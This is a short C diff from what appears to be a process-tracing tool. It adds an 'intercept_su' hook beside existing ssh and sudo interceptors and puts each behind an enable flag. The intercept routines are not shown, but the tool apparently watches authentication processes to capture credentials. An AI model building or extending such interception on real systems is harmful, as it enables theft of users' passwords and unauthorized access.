@@ -18,7 +18,7 @@
 #include "procinfo.h"
 #include "tracers.h"
 
-void (*tracers[])(pid_t) = {NULL, intercept_ssh, intercept_sudo, NULL};
+void (*tracers[])(pid_t) = {NULL, intercept_ssh, intercept_sudo, intercept_su, NULL};
 
 pid_t process_pid;
 char *process_name;
@@ -143,14 +143,17 @@ enum tracer_types validate_process_name(void) {
   if (!process_name)
     return invalid_tracer;
 
-  if (strncmp(process_name, P_SSH_NET, strlen(P_SSH_NET)) == 0)
+  if (ENABLE_SSH && strncmp(process_name, P_SSH_NET, strlen(P_SSH_NET)) == 0)
     return ssh_tracer;
 
-  if (strncmp(process_name, P_SSH_ACC, strlen(P_SSH_ACC)) == 0)
+  if (ENABLE_SSH && strncmp(process_name, P_SSH_ACC, strlen(P_SSH_ACC)) == 0)
     return ssh_tracer;
 
-  if (strncmp(process_name, P_SUDO, strlen(P_SUDO)) == 0)
+  if (ENABLE_SUDO && strncmp(process_name, P_SUDO, strlen(P_SUDO)) == 0)
     return sudo_tracer;
+
+  if (ENABLE_SU && strncmp(process_name, P_SU, strlen(P_SU)) == 0)
+    return su_tracer;
 
   return invalid_tracer;
 }
